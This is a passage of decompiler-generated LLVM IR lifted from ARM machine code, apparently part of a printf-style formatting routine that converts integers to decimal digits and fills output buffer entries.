  store i32 %v2_157d8, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v8_157d8, i1* %cpsr_n.global-to-local, align 1
  %v2_157ec = icmp eq i32 %v2_157d8, 0
  store i1 %v2_157ec, i1* %cpsr_z.global-to-local, align 1
  %v2_157f4 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_157f4, i32* %lr.global-to-local, align 4
  %tmp258 = icmp slt i32 %v2_157d8, 1
  br i1 %tmp258, label %.thread169, label %dec_label_pc_15800

.thread169:                                       ; preds = %dec_label_pc_157e8
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15840

dec_label_pc_15800:                               ; preds = %dec_label_pc_157e8
  store i32 ptrtoint (i32* @global_var_1e89b.849 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_1580c = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_1580c, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 176, i32* %stack_var_-140, align 4
  br label %dec_label_pc_15844

dec_label_pc_15820:                               ; preds = %dec_label_pc_157d4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_15820 = icmp slt i32 %v0_15834, 0
  store i1 %v1_15820, i1* %cpsr_n.global-to-local, align 1
  %v2_15820 = icmp eq i32 %v0_15834, 0
  store i1 %v2_15820, i1* %cpsr_z.global-to-local, align 1
  %v2_15824 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_15824, i32* %lr.global-to-local, align 4
  %tmp259 = icmp slt i32 %v0_15834, 1
  br i1 %tmp259, label %dec_label_pc_15840, label %dec_label_pc_15830

dec_label_pc_15830:                               ; preds = %dec_label_pc_15820
  %v2_15834 = sub i32 %v2_157c8, %v0_15834
  store i32 %v2_15834, i32* %r1.global-to-local, align 4
  %v2_15838 = add i32 %v5_157b4, %v0_15834
  store i32 %v2_15838, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15840

dec_label_pc_15840:                               ; preds = %dec_label_pc_15830, %.thread169, %dec_label_pc_15820
  %storemerge181.in = phi i32* [ %stack_var_-152, %dec_label_pc_15820 ], [ %stack_var_-140, %.thread169 ], [ %stack_var_-140, %dec_label_pc_15830 ]
  %v0_15858102 = phi i32 [ %v2_157c8, %dec_label_pc_15820 ], [ 0, %.thread169 ], [ %v2_15834, %dec_label_pc_15830 ]
  %storemerge181 = ptrtoint i32* %storemerge181.in to i32
  store i32 %storemerge181, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_15844

dec_label_pc_15844:                               ; preds = %.thread167, %dec_label_pc_15800, %dec_label_pc_15840
  %v1_1587c = phi i32 [ %v2_1580c, %dec_label_pc_15800 ], [ %storemerge181, %dec_label_pc_15840 ], [ %v5_157cc, %.thread167 ]
  %v0_15894110 = phi i32 [ -1, %dec_label_pc_15800 ], [ -1, %dec_label_pc_15840 ], [ %v0_15834, %.thread167 ]
  %v0_15858 = phi i32 [ 0, %dec_label_pc_15800 ], [ %v0_15858102, %dec_label_pc_15840 ], [ %v2_157c8, %.thread167 ]
  %v2_15844 = load i32, i32* %stack_var_-200, align 4
  store i32 %v2_15844, i32* %r2.global-to-local, align 4
  %v1_15848 = add i32 %v2_15844, 12
  %v2_15848 = inttoptr i32 %v1_15848 to i32*
  %v3_15848 = load i32, i32* %v2_15848, align 4
  %v1_1584c = and i32 %v3_15848, 16
  store i32 %v1_1584c, i32* %lr.global-to-local, align 4
  %v2_1584c = icmp eq i32 %v1_1584c, 0
  %tmp282 = zext i1 %v2_1584c to i32
  %.274 = xor i32 %tmp282, 1
  store i32 %.274, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_15858 = icmp slt i32 %v0_15858, 0
  store i1 %v1_15858, i1* %cpsr_n.global-to-local, align 1
  %v2_15858 = icmp eq i32 %v0_15858, 0
  store i1 %v2_15858, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15858, label %bb262, label %.thread40

.thread40:                                        ; preds = %dec_label_pc_15844
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15878

bb262:                                            ; preds = %dec_label_pc_15844
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 %v2_1584c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1584c, label %dec_label_pc_15868, label %dec_label_pc_15878

dec_label_pc_15868:                               ; preds = %bb262
  store i32 %v1_158f0, i32* %r3.global-to-local, align 4
  %v0_1586c = load i32, i32* %sl.global-to-local, align 4
  %v1_1586c = add i32 %v0_1586c, -103
  %v3_1586c = sub i32 102, %v0_1586c
  %v4_1586c = and i32 %v3_1586c, %v0_1586c
  %v5_1586c = icmp slt i32 %v4_1586c, 0
  store i1 %v5_1586c, i1* %cpsr_v.global-to-local, align 1
  %v6_1586c = icmp slt i32 %v1_1586c, 0
  store i1 %v6_1586c, i1* %cpsr_n.global-to-local, align 1
  %v7_1586c = icmp eq i32 %v0_1586c, 103
  store i1 %v7_1586c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1586c, label %dec_label_pc_15894, label %bb263

bb263:                                            ; preds = %dec_label_pc_15868
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v2_15870 = icmp slt i32 %v1_158f0, 0
  store i1 %v2_15870, i1* %cpsr_n.global-to-local, align 1
  %v3_15870 = icmp eq i32 %v1_158f0, 0
  store i1 %v3_15870, i1* %cpsr_z.global-to-local, align 1
  %tmp264 = icmp slt i32 %v1_158f0, 1
  br i1 %tmp264, label %dec_label_pc_15894, label %dec_label_pc_15878

dec_label_pc_15878:                               ; preds = %.thread40, %bb262, %bb263
  %v2_1587c = inttoptr i32 %v1_1587c to i32*
  store i32 112, i32* %v2_1587c, align 4
  %v1_15884 = load i32, i32* %r6.global-to-local, align 4
  %v2_15884 = add i32 %v1_15884, 4
  %v3_15884 = inttoptr i32 %v2_15884 to i32*
  store i32 1, i32* %v3_15884, align 4
  store i32 ptrtoint (i32* @global_var_1e8a8.851 to i32), i32* %r3.global-to-local, align 4
  %v1_1588c = load i32, i32* %r6.global-to-local, align 4
  %v2_1588c = add i32 %v1_1588c, 8
  %v3_1588c = inttoptr i32 %v2_1588c to i32*
  store i32 ptrtoint (i32* @global_var_1e8a8.851 to i32), i32* %v3_1588c, align 4
  %v0_15890 = load i32, i32* %r6.global-to-local, align 4
  %v1_15890 = add i32 %v0_15890, 12
  store i32 %v1_15890, i32* %r6.global-to-local, align 4
  %v0_15894.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_15894

dec_label_pc_15894:                               ; preds = %dec_label_pc_15868, %bb263, %dec_label_pc_15878
  %v1_158a0 = phi i32 [ %v1_1587c, %bb263 ], [ %v1_15890, %dec_label_pc_15878 ], [ %v1_1587c, %dec_label_pc_15868 ]
  %v0_15894 = phi i32 [ %v0_15894110, %bb263 ], [ %v0_15894.pre, %dec_label_pc_15878 ], [ %v0_15894110, %dec_label_pc_15868 ]
  %v1_15894 = add i32 %v0_15894, 1
  store i32 %v1_15894, i32* %ip.global-to-local, align 4
  %v3_15894 = sub i32 0, %v0_15894
  %v4_15894 = and i32 %v1_15894, %v3_15894
  %v5_15894 = icmp slt i32 %v4_15894, 0
  store i1 %v5_15894, i1* %cpsr_v.global-to-local, align 1
  %v6_15894 = icmp slt i32 %v1_15894, 0
  store i1 %v6_15894, i1* %cpsr_n.global-to-local, align 1
  %v7_15894 = icmp eq i32 %v1_15894, 0
  store i1 %v7_15894, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15894, label %dec_label_pc_158b8, label %dec_label_pc_1589c

dec_label_pc_1589c:                               ; preds = %dec_label_pc_15894
  %v1_1589c = sub i32 -1, %v0_15894
  %v2_158a0 = add i32 %v1_158a0, 4
  %v3_158a0 = inttoptr i32 %v2_158a0 to i32*
  store i32 %v1_1589c, i32* %v3_158a0, align 4
  store i32 ptrtoint (i32* @global_var_1e89b.849 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_158ac = load i32, i32* %r6.global-to-local, align 4
  %v2_158ac = inttoptr i32 %v1_158ac to i32*
  store i32 176, i32* %v2_158ac, align 4
  %v0_158b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_158b0 = load i32, i32* %r6.global-to-local, align 4
  %v2_158b0 = add i32 %v1_158b0, 8
  %v3_158b0 = inttoptr i32 %v2_158b0 to i32*
  store i32 %v0_158b0, i32* %v3_158b0, align 4
  %v0_158b4 = load i32, i32* %r6.global-to-local, align 4
  %v1_158b4 = add i32 %v0_158b4, 12
  store i32 %v1_158b4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_158b8

dec_label_pc_158b8:                               ; preds = %dec_label_pc_15894, %dec_label_pc_1589c
  %v2_158c0 = phi i32 [ %v1_158a0, %dec_label_pc_15894 ], [ %v1_158b4, %dec_label_pc_1589c ]
  %v0_158b8 = load i32, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_158b8 = icmp slt i32 %v0_158b8, 0
  store i1 %v1_158b8, i1* %cpsr_n.global-to-local, align 1
  %v2_158b8 = icmp eq i32 %v0_158b8, 0
  store i1 %v2_158b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_158b8, label %.thread49, label %bb265

bb265:                                            ; preds = %dec_label_pc_158b8
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_158c0 = inttoptr i32 %v2_158c0 to i32*
  store i32 112, i32* %v3_158c0, align 4
  %v1_158c4 = load i32, i32* %r4.global-to-local, align 4
  %v2_158c4 = load i32, i32* %r6.global-to-local, align 4
  %v3_158c4 = add i32 %v2_158c4, 8
  %v4_158c4 = inttoptr i32 %v3_158c4 to i32*
  store i32 %v1_158c4, i32* %v4_158c4, align 4
  %v1_158c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_158c8 = load i32, i32* %r6.global-to-local, align 4
  %v3_158c8 = add i32 %v2_158c8, 4
  %v4_158c8 = inttoptr i32 %v3_158c8 to i32*
  store i32 %v1_158c8, i32* %v4_158c8, align 4
  %v1_158cc = load i32, i32* %r6.global-to-local, align 4
  %v2_158cc = add i32 %v1_158cc, 12
  store i32 %v2_158cc, i32* %r6.global-to-local, align 4
  br label %.thread49

.thread49:                                        ; preds = %dec_label_pc_158b8, %bb265
  %v1_158f4 = phi i32 [ %v2_158c0, %dec_label_pc_158b8 ], [ %v2_158cc, %bb265 ]
  %v0_158d0 = load i32, i32* %sl.global-to-local, align 4
  %v1_158d0 = add i32 %v0_158d0, -103
  %v3_158d0 = sub i32 102, %v0_158d0
  %v4_158d0 = and i32 %v3_158d0, %v0_158d0
  %v5_158d0 = icmp slt i32 %v4_158d0, 0
  store i1 %v5_158d0, i1* %cpsr_v.global-to-local, align 1
  %v6_158d0 = icmp slt i32 %v1_158d0, 0
  store i1 %v6_158d0, i1* %cpsr_n.global-to-local, align 1
  %v7_158d0 = icmp eq i32 %v0_158d0, 103
  store i1 %v7_158d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_158d0, label %dec_label_pc_158d8, label %dec_label_pc_158e0

dec_label_pc_158d8:                               ; preds = %.thread49
  %v0_158d8 = load i32, i32* %lr.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_158d8 = icmp slt i32 %v0_158d8, 0
  store i1 %v1_158d8, i1* %cpsr_n.global-to-local, align 1
  %v2_158d8 = icmp eq i32 %v0_158d8, 0
  store i1 %v2_158d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_158d8, label %dec_label_pc_1590c, label %dec_label_pc_158e0

dec_label_pc_158e0:                               ; preds = %.thread49, %dec_label_pc_158d8
  %v0_158e0 = load i32, i32* %ip.global-to-local, align 4
  %v1_158e0 = load i32, i32* %r1.global-to-local, align 4
  %v2_158e0 = sub i32 %v1_158e0, %v0_158e0
  store i32 %v2_158e0, i32* %r3.global-to-local, align 4
  store i32 %v1_158f0, i32* %ip.global-to-local, align 4
  %v2_158e8 = sub i32 %v2_158e0, %v1_158f0
  %v4_158e8 = xor i32 %v2_158e0, %v1_158f0
  %v5_158e8 = xor i32 %v2_158e8, %v2_158e0
  %v6_158e8 = and i32 %v5_158e8, %v4_158e8
  %v7_158e8 = icmp slt i32 %v6_158e8, 0
  store i1 %v7_158e8, i1* %cpsr_v.global-to-local, align 1
  %v8_158e8 = icmp slt i32 %v2_158e8, 0
  store i1 %v8_158e8, i1* %cpsr_n.global-to-local, align 1
  %v9_158e8 = icmp eq i32 %v2_158e0, %v1_158f0
  store i1 %v9_158e8, i1* %cpsr_z.global-to-local, align 1
  %v2_158ec = xor i1 %v8_158e8, %v7_158e8
  br i1 %v2_158ec, label %dec_label_pc_158f0, label %dec_label_pc_1590c

dec_label_pc_158f0:                               ; preds = %dec_label_pc_158e0
  %v2_158f0 = sub i32 %v1_158f0, %v2_158e0
  %v2_158f4 = add i32 %v1_158f4, 4
  %v3_158f4 = inttoptr i32 %v2_158f4 to i32*
  store i32 %v2_158f0, i32* %v3_158f4, align 4
  store i32 ptrtoint (i32* @global_var_1e89b.849 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_15900 = load i32, i32* %r6.global-to-local, align 4
  %v2_15900 = inttoptr i32 %v1_15900 to i32*
  store i32 176, i32* %v2_15900, align 4
  %v0_15904 = load i32, i32* %r3.global-to-local, align 4
  %v1_15904 = load i32, i32* %r6.global-to-local, align 4
  %v2_15904 = add i32 %v1_15904, 8
  %v3_15904 = inttoptr i32 %v2_15904 to i32*
  store i32 %v0_15904, i32* %v3_15904, align 4
  %v0_15908 = load i32, i32* %r6.global-to-local, align 4
  %v1_15908 = add i32 %v0_15908, 12
  store i32 %v1_15908, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1590c

dec_label_pc_1590c:                               ; preds = %dec_label_pc_158e0, %dec_label_pc_158d8, %dec_label_pc_158f0
  %v1_159a0.pre.pre = phi i32 [ %v1_158f4, %dec_label_pc_158e0 ], [ %v1_158f4, %dec_label_pc_158d8 ], [ %v1_15908, %dec_label_pc_158f0 ]
  %v0_1590c = load i32, i32* %r7.global-to-local, align 4
  %v1_1590c = add i32 %v0_1590c, -102
  %v3_1590c = sub i32 101, %v0_1590c
  %v4_1590c = and i32 %v3_1590c, %v0_1590c
  %v5_1590c = icmp slt i32 %v4_1590c, 0
  store i1 %v5_1590c, i1* %cpsr_v.global-to-local, align 1
  %v6_1590c = icmp slt i32 %v1_1590c, 0
  store i1 %v6_1590c, i1* %cpsr_n.global-to-local, align 1
  %v7_1590c = icmp eq i32 %v0_1590c, 102
  store i1 %v7_1590c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1590c, label %dec_label_pc_15994, label %dec_label_pc_15914

dec_label_pc_15914:                               ; preds = %dec_label_pc_1590c
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_15918 = load i32, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_15918 = icmp slt i32 %v0_15918, 0
  store i1 %v1_15918, i1* %cpsr_n.global-to-local, align 1
  %v2_15918 = icmp eq i32 %v0_15918, 0
  store i1 %v2_15918, i1* %cpsr_z.global-to-local, align 1
  store i32 %stack_var_-58.0131138, i32* %r8.global-to-local, align 4
  store i32 0, i32* %stack_var_-43, align 4
  %v4_1592c = sub i32 0, %v0_15918
  %storemerge180 = select i1 %v1_15918, i32 %v4_1592c, i32 %v0_15918
  %tmp283 = ashr i32 %v0_15918, 31
  %tmp284 = and i32 %tmp283, 2
  %tmp285 = add nuw nsw i32 %tmp284, 43
  store i32 %storemerge180, i32* %r4.global-to-local, align 4
  store i32 %tmp285, i32* %sl.global-to-local, align 4
  %v2_15934 = ptrtoint i32* %stack_var_-43 to i32
  store i32 %v2_15934, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1593c

dec_label_pc_1593c:                               ; preds = %dec_label_pc_1596c, %dec_label_pc_1593c, %dec_label_pc_15914
  %v2_15954 = phi i32 [ %v2_15934, %dec_label_pc_15914 ], [ %v6_15954, %dec_label_pc_1593c ], [ %v6_15954, %dec_label_pc_1596c ]
  %v0_15950 = phi i32 [ %storemerge180, %dec_label_pc_15914 ], [ %v2_15958, %dec_label_pc_1593c ], [ %v2_15958, %dec_label_pc_1596c ]
  %v2_15944 = srem i32 %v0_15950, 10
  %v1_15948 = add nsw i32 %v2_15944, 48
  store i32 %v1_15948, i32* %r3.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  store i32 %v0_15950, i32* %r0.global-to-local, align 4
  %v1_15954 = trunc i32 %v1_15948 to i8
  %v3_15954 = add i32 %v2_15954, -1
  %v4_15954 = inttoptr i32 %v3_15954 to i8*
  store i8 %v1_15954, i8* %v4_15954, align 1
  %v5_15954 = load i32, i32* %r5.global-to-local, align 4
  %v6_15954 = add i32 %v5_15954, -1
  store i32 %v6_15954, i32* %r5.global-to-local, align 4
  %v0_15958 = load i32, i32* %r0.global-to-local, align 4
  %v1_15958 = load i32, i32* %r1.global-to-local, align 4
  %v2_15958 = sdiv i32 %v0_15958, %v1_15958
  store i32 %v2_15958, i32* %r0.global-to-local, align 4
  %v0_1595c = load i32, i32* %r7.global-to-local, align 4
  %v1_1595c = add i32 %v0_1595c, 1
  store i32 %v1_1595c, i32* %r7.global-to-local, align 4
  %v1_15960 = add i32 %v0_1595c, -2
  %v3_15960 = sub i32 1, %v0_1595c
  %v4_15960 = and i32 %v3_15960, %v1_1595c
  %v5_15960 = icmp slt i32 %v4_15960, 0
  store i1 %v5_15960, i1* %cpsr_v.global-to-local, align 1
  %v6_15960 = icmp slt i32 %v1_15960, 0
  store i1 %v6_15960, i1* %cpsr_n.global-to-local, align 1
  %v7_15960 = icmp eq i32 %v1_1595c, 3
  store i1 %v7_15960, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_15958, i32* %r4.global-to-local, align 4
  %v7_15968 = icmp slt i32 %v1_1595c, 4
  br i1 %v7_15968, label %dec_label_pc_1593c, label %dec_label_pc_1596c

dec_label_pc_1596c:                               ; preds = %dec_label_pc_1593c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1596c = icmp slt i32 %v2_15958, 0
  store i1 %v1_1596c, i1* %cpsr_n.global-to-local, align 1
  %v2_1596c = icmp eq i32 %v2_15958, 0
  store i1 %v2_1596c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1596c, label %dec_label_pc_15974, label %dec_label_pc_1593c

dec_label_pc_15974:                               ; preds = %dec_label_pc_1596c
  %v1_15974 = add i32 %v5_15954, -2
  store i32 %v1_15974, i32* %r3.global-to-local, align 4
  %v0_15978 = load i32, i32* %sl.global-to-local, align 4
  %v1_15978 = trunc i32 %v0_15978 to i8
  %v4_15978 = inttoptr i32 %v1_15974 to i8*
  store i8 %v1_15978, i8* %v4_15978, align 1
  %v0_1597c = load i32, i32* %r3.global-to-local, align 4
  %v1_1597c = add i32 %v0_1597c, -1
  store i32 %v1_1597c, i32* %r2.global-to-local, align 4
  %v0_15980 = load i32, i32* %r8.global-to-local, align 4
  %v1_15980 = trunc i32 %v0_15980 to i8
  %v4_15980 = inttoptr i32 %v1_1597c to i8*
  store i8 %v1_15980, i8* %v4_15980, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_15988 = load i32, i32* %r6.global-to-local, align 4
  %v1_15988 = inttoptr i32 %v0_15988 to i32*
  store i32 112, i32* %v1_15988, align 4
  %v3_15988 = add i32 %v0_15988, 4
  %v4_15988 = inttoptr i32 %v3_15988 to i32*
  %v5_15988 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_15988, i32* %v4_15988, align 4
  %v0_1598c = load i32, i32* %r2.global-to-local, align 4
  %v1_1598c = load i32, i32* %r6.global-to-local, align 4
  %v2_1598c = add i32 %v1_1598c, 8
  %v3_1598c = inttoptr i32 %v2_1598c to i32*
  store i32 %v0_1598c, i32* %v3_1598c, align 4
  %v0_15990 = load i32, i32* %r6.global-to-local, align 4
  %v1_15990 = add i32 %v0_15990, 12
  store i32 %v1_15990, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15994

dec_label_pc_15994:                               ; preds = %dec_label_pc_1590c, %.thread127, %dec_label_pc_15974
  %v1_159a0.pre = phi i32 [ %v2_1544c, %.thread127 ], [ %v1_15990, %dec_label_pc_15974 ], [ %v1_159a0.pre.pre, %dec_label_pc_1590c ]
  %v2_15994 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_15994, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15998

dec_label_pc_15998:                               ; preds = %dec_label_pc_15998, %dec_label_pc_15994
  %v0_15998 = phi i32 [ %v2_15994, %dec_label_pc_15994 ], [ %v4_15998, %dec_label_pc_15998 ]
  %stack_var_-188.0 = phi i32 [ %v3_152fc, %dec_label_pc_15994 ], [ %v2_159a4, %dec_label_pc_15998 ]
  %v1_15998 = inttoptr i32 %v0_15998 to i32*
  %v2_15998 = load i32, i32* %v1_15998, align 4
  store i32 %v2_15998, i32* %r3.global-to-local, align 4
  %v4_15998 = add i32 %v0_15998, 12
  store i32 %v4_15998, i32* %r2.global-to-local, align 4
  %v3_159a0 = icmp ult i32 %v4_15998, %v1_159a0.pre
  %v2_159a4 = sub i32 %stack_var_-188.0, %v2_15998
  store i32 %v2_159a4, i32* %r0.global-to-local, align 4
  br i1 %v3_159a0, label %dec_label_pc_15998, label %dec_label_pc_159b0

dec_label_pc_159b0:                               ; preds = %dec_label_pc_15998
  %v3_159b0 = load i8, i8* %stack_var_-42, align 1
  %v4_159b0 = sext i8 %v3_159b0 to i32
  store i32 %v4_159b0, i32* %r3.global-to-local, align 4
  store i32 %v4_159b0, i32* %r2.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_159b4 = icmp slt i8 %v3_159b0, 0
  store i1 %v1_159b4, i1* %cpsr_n.global-to-local, align 1
  %v2_159b4 = icmp eq i8 %v3_159b0, 0
  store i1 %v2_159b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_159b4, label %bb270, label %bb269

bb269:                                            ; preds = %dec_label_pc_159b0
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb270

bb270:                                            ; preds = %dec_label_pc_159b0, %bb269
  %v1_15a08 = phi i32 [ %v4_159b0, %dec_label_pc_159b0 ], [ 1, %bb269 ]
  %v2_159bc = sub i32 %v2_159a4, %v1_15a08
  store i32 %v2_159bc, i32* %r1.global-to-local, align 4
  %v2_159c0 = ptrtoint i8* %stack_var_-42 to i32
  store i32 %v2_159c0, i32* %r3.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_159c8 = icmp slt i32 %v2_159bc, 0
  store i1 %v1_159c8, i1* %cpsr_n.global-to-local, align 1
  %v2_159c8 = icmp eq i32 %v2_159bc, 0
  store i1 %v2_159c8, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-176, align 4
  %tmp271 = icmp slt i32 %v2_159bc, 1
  br i1 %tmp271, label %dec_label_pc_15a30, label %dec_label_pc_159dc

dec_label_pc_159dc:                               ; preds = %bb270
  %v2_159dc = load i32, i32* %stack_var_-200, align 4
  store i32 %v2_159dc, i32* %ip.global-to-local, align 4
  %v1_159e0 = add i32 %v2_159dc, 12
  %v2_159e0 = inttoptr i32 %v1_159e0 to i32*
  %v3_159e0 = load i32, i32* %v2_159e0, align 4
  store i32 %v3_159e0, i32* %r3.global-to-local, align 4
  %v1_159e4 = and i32 %v3_159e0, 8
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_159e4 = icmp eq i32 %v1_159e4, 0
  store i1 %v2_159e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_159e4, label %dec_label_pc_159fc, label %dec_label_pc_159ec

dec_label_pc_159ec:                               ; preds = %dec_label_pc_159dc
  store i32 ptrtoint (i32* @global_var_1e89b.849 to i32), i32* %r3.global-to-local, align 4
  %v1_159f0 = add i32 %v1_159a0.pre, 12
  store i32 %v1_159f0, i32* %r5.global-to-local, align 4
  %v1_159f4 = inttoptr i32 %v1_159a0.pre to i32*
  store i32 160, i32* %v1_159f4, align 4
  %v3_159f4 = add i32 %v1_159a0.pre, 4
  %v4_159f4 = inttoptr i32 %v3_159f4 to i32*
  %v5_159f4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_159f4, i32* %v4_159f4, align 4
  %v6_159f4 = add i32 %v1_159a0.pre, 8
  %v7_159f4 = inttoptr i32 %v6_159f4 to i32*
  %v8_159f4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_159f4, i32* %v7_159f4, align 4
  br label %dec_label_pc_15a34

dec_label_pc_159fc:                               ; preds = %dec_label_pc_159dc
  store i32 %v2_159dc, i32* %r0.global-to-local, align 4
  %v1_15a00 = add i32 %v2_159dc, 16
  %v2_15a00 = inttoptr i32 %v1_15a00 to i32*
  %v3_15a00 = load i32, i32* %v2_15a00, align 4
  store i32 %v3_15a00, i32* %r3.global-to-local, align 4
  %v1_15a04 = add i32 %v3_15a00, -48
  %v3_15a04 = sub i32 47, %v3_15a00
  %v4_15a04 = and i32 %v3_15a04, %v3_15a00
  %v5_15a04 = icmp slt i32 %v4_15a04, 0
  store i1 %v5_15a04, i1* %cpsr_v.global-to-local, align 1
  %v6_15a04 = icmp slt i32 %v1_15a04, 0
  store i1 %v6_15a04, i1* %cpsr_n.global-to-local, align 1
  %v7_15a04 = icmp eq i32 %v3_15a00, 48
  store i1 %v7_15a04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15a04, label %dec_label_pc_15a14, label %bb272

bb272:                                            ; preds = %dec_label_pc_159fc
  store i32 %v2_159a4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15a30

dec_label_pc_15a14:                               ; preds = %dec_label_pc_159fc
  %v3_15a14 = load i32, i32* %stack_var_-160, align 4
  store i32 %v1_159a0.pre, i32* %r5.global-to-local, align 4
  %v2_15a1c = add i32 %v3_15a14, %v2_159bc
  store i32 %v2_15a1c, i32* %r3.global-to-local, align 4
  store i32 %v2_15a1c, i32* %stack_var_-160, align 4
  br label %dec_label_pc_15a34

dec_label_pc_15a28:                               ; preds = %dec_label_pc_15a3c
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15a6c

dec_label_pc_15a30:                               ; preds = %bb272, %bb270
  store i32 %v1_159a0.pre, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15a34

dec_label_pc_15a34:                               ; preds = %dec_label_pc_15a14, %dec_label_pc_159ec, %dec_label_pc_15a30
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_15a38 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_15a38, i32* %r4.global-to-local, align 4
  %v3_15a44.pre = load i32, i32* %stack_var_0, align 4
  br label %dec_label_pc_15a3c

dec_label_pc_15a3c:                               ; preds = %dec_label_pc_15a64, %dec_label_pc_15a34
  %v0_15a3c = phi i32 [ %v1_15a5c, %dec_label_pc_15a64 ], [ %v2_15a38, %dec_label_pc_15a34 ]
  %v1_15a3c = inttoptr i32 %v0_15a3c to i32*
  %v2_15a3c = load i32, i32* %v1_15a3c, align 4
  store i32 %v2_15a3c, i32* %r1.global-to-local, align 4
  %v3_15a3c = add i32 %v0_15a3c, 4
  %v4_15a3c = inttoptr i32 %v3_15a3c to i32*
  %v5_15a3c = load i32, i32* %v4_15a3c, align 4
  store i32 %v5_15a3c, i32* %r2.global-to-local, align 4
  %v6_15a3c = add i32 %v0_15a3c, 8
  %v7_15a3c = inttoptr i32 %v6_15a3c to i32*
  %v8_15a3c = load i32, i32* %v7_15a3c, align 4
  store i32 %v8_15a3c, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %v3_15a44.pre, i32* %ip.global-to-local, align 4
  store i32 88656, i32* %lr.global-to-local, align 4
  %v1_15a4c = call i32 @unknown_0()
  store i32 %v1_15a4c, i32* %r0.global-to-local, align 4
  %v0_15a50 = load i32, i32* %r4.global-to-local, align 4
  %v1_15a50 = add i32 %v0_15a50, 4
  %v2_15a50 = inttoptr i32 %v1_15a50 to i32*
  %v3_15a50 = load i32, i32* %v2_15a50, align 4
  store i32 %v3_15a50, i32* %r3.global-to-local, align 4
  %v2_15a54 = sub i32 %v1_15a4c, %v3_15a50
  %v4_15a54 = xor i32 %v3_15a50, %v1_15a4c
  %v5_15a54 = xor i32 %v2_15a54, %v1_15a4c
  %v6_15a54 = and i32 %v5_15a54, %v4_15a54
  %v7_15a54 = icmp slt i32 %v6_15a54, 0
  store i1 %v7_15a54, i1* %cpsr_v.global-to-local, align 1
  %v8_15a54 = icmp slt i32 %v2_15a54, 0
  store i1 %v8_15a54, i1* %cpsr_n.global-to-local, align 1
  %v9_15a54 = icmp eq i32 %v1_15a4c, %v3_15a50
  store i1 %v9_15a54, i1* %cpsr_z.global-to-local, align 1
  %v0_15a58 = load i32, i32* %r6.global-to-local, align 4
  %v2_15a58 = add i32 %v0_15a58, %v1_15a4c
  store i32 %v2_15a58, i32* %r6.global-to-local, align 4
  %v1_15a5c = add i32 %v0_15a50, 12
  store i32 %v1_15a5c, i32* %r4.global-to-local, align 4
